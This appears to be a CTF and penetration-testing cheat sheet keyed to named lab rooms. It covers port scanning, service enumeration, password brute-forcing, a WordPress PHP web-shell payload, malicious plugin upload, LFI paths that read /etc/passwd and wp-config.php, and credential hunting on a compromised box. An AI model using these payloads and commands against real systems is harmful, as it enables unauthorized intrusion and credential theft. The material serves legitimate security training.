### What ports are open?

| Condition | Action |
|---|---|
| **Always start with** | `nmap -sC -sV -oA scan $IP` — **tip:** Add `-p-` to scan all 65535 ports — default scan misses high ports *(UltraTech: API on port 8081 + app on 31331 only found with -p-)* |
| **FTP open (21)** | `ftp $IP` → login: `anonymous` — look for notes, keys, images, configs |
| **FTP missed on IP** | Rescan with hostname — vhosts can expose different services |
| **SMB open (139/445)** | `enum4linux -a $IP` — users, shares, password policy |
| **HTTP open (80/8080)** | Check robots.txt, page source (including title tag), response headers, fuzz dirs — tools: gobuster, dirb, feroxbuster *(Team: hostname hint in `<title>` tag)* |
| **HTTP Basic Auth** | `hydra -l <user> -P passwords.txt $IP http-head /` |
| **Response headers** | Check Set-Cookie domain and X-Powered-By in Burp — may reveal hidden vhosts *(Harder)* |
| **Subdomain fuzzing** *(new)* | Fuzz virtual hosts by spoofing the Host header — finds subdomains not visible in DNS<br>• `wfuzz -c --hw 977 -w common.txt -u http://team.thm/ -H "Host: FUZZ.team.thm" --hc 400`<br>• Tune `--hw` (hide by word count) to filter the default page response size<br>• Also try: `ffuf -w wordlist.txt -u http://target/ -H "Host: FUZZ.target.thm" -fs <default_size>`<br>*Team (found dev.team.thm)* |

---

### Web app found — what's running?

| Condition | Action |
|---|---|
| **WordPress** | • Enumerate: `wpscan --url http://target/wordpress` — finds plugins, themes, users, vulns<br>• Bruteforce: `wpbrute -u admin -w passwords.txt -target http://target/wp-login.php`<br>• RCE option 1: Theme Editor → 404.php → `<?php system($_GET['cmd']) ?>`<br>• RCE option 2: Install malicious plugin (zip with PHP shell) via Plugins → Add New → Upload<br>• FTP: grab `wp-config.php` → DB creds → phpMyAdmin → `wp_users` + `wp_options`<br>*Mr Robot, Internal, Different CTF, All in One (plugin upload RCE)* |
| **WordPress plugin LFI** *(new)* | Vulnerable plugins often have LFI in their PHP files — wpscan identifies them<br>• Example: mail-masta 1.0 → `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`<br>• Chain with PHP filter to read wp-config.php: `?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php`<br>*All in One (mail-masta plugin LFI)* |
| **Exposed .git dir** | `git-dumper http://target/.git/ ./output/` *(Harder)* |
| **Known CMS / version** | Search ExploitDB for version-specific RCE |
| **Custom / unknown app** | Read source & comments; fuzz params + hidden params (paramminer) |
| **Default / broken page** | View page source including `<title>` — creds or hostnames may be embedded *(Team, Pickle Rick, Madness)* |

---

### On-box enumeration after getting a shell

| Condition | Action |
|---|---|
| **Listening services** | `ss -tulpn` *(Year of the Fox, Chillhack)* |
| **Kernel version** | `uname -a` → Google version + "privilege escalation exploit" *(London Bridge)* |
| **Files owned by web user** | `find / -user www 2>/dev/null` or `find /usr/bin -group <username>` |
| **SQLite / DB files** | Look for .db / .sqlite files — may contain password hashes<br>• `find / -name "*.db" -o -name "*.sqlite" 2>/dev/null`<br>• Open: `sqlite3 file.db` → `.tables` → `SELECT * FROM users;`<br>• Crack hashes at CrackStation<br>*UltraTech (sqlite file with MD5 hashes)* |
| **Shell scripts on system** | `find / -type f -name "*.sh" 2>/dev/null` |
| **Periodic/cron scripts** | `cat /etc/periodic/15min/*` — often contain plaintext creds *(Harder)* |
| **Subdomains in /var/www** | `ls /var/www/` |

